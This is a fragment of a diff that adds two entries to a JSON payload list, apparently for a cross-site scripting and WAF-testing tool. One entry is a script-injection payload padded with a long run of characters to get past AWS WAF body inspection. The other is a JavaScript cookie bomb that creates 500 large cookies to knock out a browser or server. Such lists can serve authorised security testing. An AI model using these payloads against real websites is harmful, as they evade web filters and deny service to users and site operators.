+    "Payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert('AWS_WAF_BYPASS')</script>",
+    "Attribute": [
+      "A",
+      "<",
+      ">",
+      "(",
+      ")",
+      "'",
+      "_",
+      "/",
+      ";"
+    ],
+    "waf": "aws",
+    "count": 0,
+    "description": "AWS WAF bypass using 8192+ character prefix - exploits request body inspection limit",
+    "level": "critical"
+  },
+  {
+    "Payload": "for (let i = 0; i < 500; i++) { var a = 'A'.repeat(500); document.cookie = `${i}=${a}`; }",
+    "Attribute": [
+      "(",
+      ")",
+      "{",
+      "}",
+      ";",
+      "'",
+      ".",
+      "=",
+      "`",
+      "$",
+      "<",
+      ">"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Cookie bomb DoS attack - creates 500 large cookies to overwhelm browser/server",
+    "level": "high"
   }
 ]
